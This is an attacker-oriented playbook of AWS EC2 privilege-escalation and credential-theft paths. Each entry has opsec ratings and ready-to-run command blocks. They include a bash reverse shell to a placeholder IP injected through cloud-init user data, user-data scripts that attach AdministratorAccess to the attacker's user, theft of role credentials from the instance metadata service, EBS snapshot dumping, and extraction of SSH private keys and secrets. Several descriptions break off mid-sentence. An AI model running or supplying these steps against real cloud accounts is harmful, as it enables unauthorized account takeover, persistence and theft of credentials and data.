# EC2 - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + ec2:RunInstances [added: 2026-04]
- **Tags:** #Iam #Ec2 #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ec2 service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ec2:RunInstances; A role must exist that trusts ec2.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ec2-001] A principal with `iam:PassRole` and `ec2:RunInstances` permissions can launch a new EC2 instance and attach an existing IAM Role to it. By accessing this new instance (e.g., via User Data or SSM), the attacker can obtain the credentials of the passed role. The level of access gained depends on the permissions of the available roles.
- **Payload/Method:**
```
# Step 1: Launch EC2 instance with privileged role and user data script to exfiltrate credentials
aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Arn="arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE" --user-data file://exploit.sh

# Step 2: Retrieve the temporary credentials from the attacker's server
# User data script executes on boot and sends credentials to attacker-controlled server
```

### ec2:ModifyInstanceAttribute + ec2:StopInstances + ec2:StartInstances [added: 2026-04]
- **Tags:** #Ec2 #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ec2 in scope
- **Prereq:** IAM perms: ec2:ModifyInstanceAttribute, ec2:StopInstances, ec2:StartInstances; EC2 instance must have an instance profile attached to an IAM role
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ec2-002] An attacker with the permissions to modify an EC2 instance's attributes, stop it, and start it can gain full control over the instance. The `ec2:ModifyInstanceAttribute` permission can be used to change an instance's userData, which is a script that normally runs on the initial boot. However with a specially crafted payload, a modified userData script can be coerced to run on subsequent restarts. 
- **Payload/Method:**
```
# Step 1: Create base64-encoded malicious user data with reverse shell payload
# Create malicious user data with cloud-init configuration
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"
printf "%s" "$TEXT" | base64 > "$TEXT_PATH"

# Step 2: Stop the target EC2 instance
aws ec2 stop-instances --instance-ids $INSTANCE_ID

# Step 3: Modify the user data with the malicious script
aws ec2 modify-instance-attribute --instance-id "$INSTANCE_ID" --attribute userData --value "file://$TEXT_PATH"

# Step 4: Start the instance to trigger execution of the malicious user data
aws ec2 start-instances --instance-ids $INSTANCE_ID
```

### iam:PassRole + ec2:RequestSpotInstances [added: 2026-04]
- **Tags:** #Iam #Ec2 #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + ec2 service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, ec2:RequestSpotInstances; A role must exist that trusts ec2.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [ec2-003] A principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions can escalate privileges by requesting an EC2 Spot Instance with a privileged IAM instance profile. The Spot Instance launches with the privileged role's credentials, which can then be used to execute commands (via user-data scripts) that grant additional permissions to the starting principal. This technique is functionally 
- **Payload/Method:**
```
# Step 1: Gather necessary information including account ID, AMI, VPC, and subnet for launching the Spot Instance
# Get the AWS account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)

# Find a suitable AMI (Amazon Linux 2023)
AMI_ID=$(aws ec2 describe-images \
    --owners amazon \
    --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" \
    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
    --output text)

# Get default VPC and subnet
DEFAULT_VPC=$(aws ec2 describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)
DEFAULT_SUBNET=$(aws ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)

# Step 2: Prepare a user-data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME
# Create user-data script to attach AdministratorAccess to starting principal
USER_DATA=$(cat <<'EOF'
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="YOUR_USERNAME_HERE"

# Wait for IAM role to be available
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name $STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
EOF
)

# Base64 encode the user-data
USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')

# Step 3: Create the launch specification JSON for the Spot Instance request. Replace PRIVILEGED_INSTANCE_PROFILE_NAME with the na
# Create launch specification for the Spot Instance
LAUNCH_SPEC=$(cat <<EOF
{
  "ImageId": "$AMI_ID",
  "InstanceType": "t3.micro",
  "IamInstanceProfile": {
    "Name": "PRIVILEGED_INSTANCE_PROFILE_NAME"
  },
  "UserData": "$USER_DATA_B64",
  "NetworkInterfaces": [
    {
      "DeviceIndex": 0,
      "SubnetId": "$DEFAULT_SUBNET",
      "AssociatePublicIpAddress": true
    }
  ]
}
EOF
)

# Step 4: Request an EC2 Spot Instance with the privileged instance profile. This uses `iam:PassRole` to assign the privileged rol
# Request the Spot Instance with the privileged instance profile
aws ec2 request-spot-instances \
    --spot-price "0.05" \
    --instance-count 1 \
    --type "one-time" \
    --launch-specification "$LAUNCH_SPEC"

# Step 5: Monitor the Spot Instance request until it is fulfilled. Replace SPOT_REQUEST_ID with the ID from the previous command. 
# Monitor the Spot Instance request status
aws ec2 describe-spot-instance-requests \
    --spot-instance-request-ids SPOT_REQUEST_ID \
    --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \
    --output table
```

### ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate [added: 2026-04]
- **Tags:** #Ec2 #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ec2 + iam in scope
- **Prereq:** IAM perms: ec2:CreateLaunchTemplateVersion, ec2:ModifyLaunchTemplate; A launch template must exist that references an IAM role with administrative per
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ec2-004] A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does 
- **Payload/Method:**
```
# Step 1: Enumerate existing launch templates to identify targets for modification.
# Discover existing launch templates
aws ec2 describe-launch-templates \
  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \
  --output table

# Step 2: Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. 
# Get template details including instance profile
aws ec2 describe-launch-template-versions \
  --launch-template-id lt-xxxxxxxxxxxxx \
  --versions '$Default' \
  --query 'LaunchTemplateVersions[0].LaunchTemplateData'

# Step 3: Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOU
# Prepare malicious user data script
cat > user-data.sh <<'EOF'
#!/bin/bash
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
echo "Starting privilege escalation script..."

STARTING_USER_NAME="YOUR_USERNAME_HERE"

# Wait for IAM role to be available
sleep 15

# Attach AdministratorAccess policy to the starting user
aws iam attach-user-policy \
  --user-name $STARTING_USER_NAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
EOF

# Base64 encode the user data
USER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\n')

# Step 4: Create a new launch template version that references the existing privileged instance profile and includes the malicious
# Create a new launch template version with malicious user data
# Keep the same instance profile from the existing version (no PassRole needed)
aws ec2 create-launch-template-version \
  --launch-template-id lt-xxxxxxxxxxxxx \
  --source-version 1 \
  --launch-template-data "{
    \"IamInstanceProfile\": {
      \"Name\": \"EXISTING_PRIVILEGED_INSTANCE_PROFILE\"
    },
    \"UserData\": \"$USER_DATA_B64\"
  }"

# Step 5: Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version numb
# Set the new version as the default
aws ec2 modify-launch-template \
  --launch-template-id lt-xxxxxxxxxxxxx \
  --default-version NEW_VERSION_NUMBER
```

### ec2-instance-connect:SendSSHPublicKey [added: 2026-04]
- **Tags:** #Ec2 #Ec2InstanceConnect #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; ec2 + ec2-instance-connect in scope
- **Prereq:** IAM perms: ec2-instance-connect:SendSSHPublicKey, ec2:DescribeInstances; An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or 
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [ec2instanceconnect-003] A principal with `ec2-instance-connect:SendSSHPublicKey` can push a temporary SSH public key to an EC2 instance and establish an SSH connection. If the target EC2 instance has a privileged IAM role attached via an instance profile, the attacker can SSH into the instance and access the instance metadata service (IMDS) to retrieve temporary credentials for that role. This provides the attacker with 
- **Payload/Method:**
```
# Step 1: List running EC2 instances to find targets with privileged roles
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"

# Step 2: Check the instance profile to determine the attached role's permissions
aws iam get-instance-profile --instance-profile-name INSTANCE_PROFILE_NAME

# Step 3: Generate a temporary SSH key pair
ssh-keygen -t rsa -f /tmp/temp_key -N ""

# Step 4: Push the temporary public key to the target instance (valid for 60 seconds)
aws ec2-instance-connect send-ssh-public-key \
  --instance-id i-1234567890abcdef0 \
  --instance-os-user ec2-user \
  --ssh-public-key file:///tmp/temp_key.pub

# Step 5: SSH into the instance using the temporary key (must connect within 60 seconds)
ssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP
```

### EBS Snapshot Dumping via dsnap Tool [added: 2026-05]
- **Tags:** #AWS #EBS #Snapshot #dsnap #DataExfil #SnapshotDump #FileSystemAccess #CredentialTheft
- **Trigger:** IAM permissions allow listing/describing EBS snapshots; target snapshot contains sensitive data or credentials
- **Prereq:** AWS credentials with `ec2:DescribeSnapshots` permission; dsnap tool installed (pipx); target snapshot must be in the same region or shared with attacker account
- **Yields:** Full filesystem contents of the snapshot (including configs, SSH keys, application data)
- **Opsec:** Low (snapshot enumeration is passive; dumping via tool may not leave logs depending on snapshot sharing model)
- **Context:** dsnap is a tool that directly downloads EBS snapshot blocks without needing EC2 instances. Faster than traditional snapshot → create-volume → attach → mount approach. Enables rapid extraction of sensitive files like SSH private keys from compromised instances.
- **Payload/Method:**
  ```bash
  # Install dsnap via pipx
  pipx install git+https://github.com/RhinoSecurityLabs/dsnap.git
  
  # List snapshots in current region
  aws ec2 describe-snapshots --owner-ids self
  
  # Download snapshot contents using dsnap
  dsnap --snapshot-id snap-xxxxxxxxx --download-dir ./snapshot_dump
  
  # Extract filesystem from snapshot
  ls -la ./snapshot_dump/
  ```
- **Note:** dsnap can mount snapshot contents directly in some cases; if snapshot is shared cross-account, ensure target account permissions allow it.

### SSH Private Key Extraction from EBS Snapshot [added: 2026-05]
- **Tags:** #AWS #EBS #Snapshot #SSHKeys #CredentialTheft #PrivateKeyExfil #LateralMovement #PrivEsc
- **Trigger:** Dumped/mounted EBS snapshot contains user home directories (Linux) or known SSH key paths
- **Prereq:** Filesystem access to snapshot (via dsnap dump, snapshot mount, or container overlay); target instance uses SSH keys for authentication
- **Yields:** SSH private keys allowing lateral movement to target instances or other systems using key-based auth
- **Opsec:** Low (once snapshot is mounted, extraction is local)
- **Context:** Compromised EC2 instances often store SSH private keys in `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, etc. Extracting these from snapshots bypasses the need for instance access and allows SSH connection to the instance using the extracted key.
- **Payload/Method:**
  ```bash
  # After dumping snapshot via dsnap or mounting it:
  
  # For Linux snapshots, common SSH key paths:
  find ./snapshot_dump -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys"
  
  # Extract keys
  cp ./snapshot_dump/home/*//.ssh/id_rsa ./extracted_key
  chmod 600 ./extracted_key
  
  # Use extracted key for SSH access (requires knowing target IP)
  ssh -i ./extracted_key ubuntu@<instance-ip>
  
  # For AWS targets, cross-reference snapshot with running instances via EC2 API:
  aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, PrivateIpAddress, ImageId]'
  ```

### Docker Container Build from EBS Snapshot Filesystem [added: 2026-05]
- **Tags:** #AWS #EBS #Snapshot #Docker #Container #FileSystemAccess #DataExfil #Forensics
- **Trigger:** Snapshot contains complete application or system filesystem; need interactive access to extracted files or credential discovery
- **Prereq:** dsnap dump or mounted snapshot filesystem; Docker installed; ability to write Dockerfile
- **Yields:** Running container with full snapshot filesystem accessible — enables credential harvesting, database inspection, configuration review
- **Opsec:** Low (container runs locally)
- **Context:** After dumping snapshot contents, build a Docker image from the filesystem to gain interactive access and search for credentials (DB connection strings, API keys, SSH keys) embedded in configs or environment files.
- **Payload/Method:**
  ```bash
  # After dumping snapshot with dsnap:
  cd ./snapshot_dump
  
  # Create Dockerfile pointing to snapshot filesystem root
  cat > Dockerfile << 'DOCKER'
  FROM scratch
  COPY ./ /
  ENTRYPOINT ["/bin/bash"]
  DOCKER
  
  # Build image
  docker build -t snapshot-fs .
  
  # Run container with snapshot filesystem
  docker run -it snapshot-fs /bin/bash
  
  # Inside container, search for credentials:
  grep -r "password\|secret\|key\|token" /etc/ /opt/ /home/ 2>/dev/null
  find / -name "*.pem" -o -name "*.key" 2>/dev/null
  cat /etc/passwd  # user enumeration
  ```

### AWS Credential Rotation Bypass via Snapshot-Extracted SSH Keys [added: 2026-05]
- **Tags:** #AWS #EBS #Snapshot #SSHKeys #CredentialBypass #KeyRotation #LateralMovement #Persistence
- **Trigger:** AWS console credentials have rotated or expired; SSH keys exist in snapshot or on accessible instance
- **Prereq:** SSH key extracted from snapshot or found via other means; target instance has SSH enabled and key-based auth configured
- **Yields:** SSH access to EC2 instance, bypassing temporary credential expiration; access to harvested AWS credentials stored on the instance
- **Opsec:** Low (SSH connections may not be logged depending on instance logging configuration)
- **Context:** AWS access keys rotate daily or on demand. Once keys expire, console and API access fail. However, SSH keys embedded in instance filesystems remain valid. Extract keys via snapshot and use them for persistent SSH access to harvest new credentials or re-authenticate.
- **Payload/Method:**
  ```bash
  # Extract SSH key from snapshot
  extracted_key="./snapshot_key"
  instance_ip="10.0.0.50"  # from EC2 describe-instances
  
  # SSH into instance using extracted key
  ssh -i $extracted_key ec2-user@$instance_ip
  
  # Inside instance, harvest AWS credentials (often in environment or metadata):
  env | grep -i aws
  cat /home/ec2-user/.aws/credentials
  
  # Query metadata service for temporary credentials
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
  
  # Use harvested credentials for lateral movement or privilege escalation
  export AWS_ACCESS_KEY_ID=<harvested-key>
  export AWS_SECRET_ACCESS_KEY=<harvested-secret>
  aws sts get-caller-identity
  ```
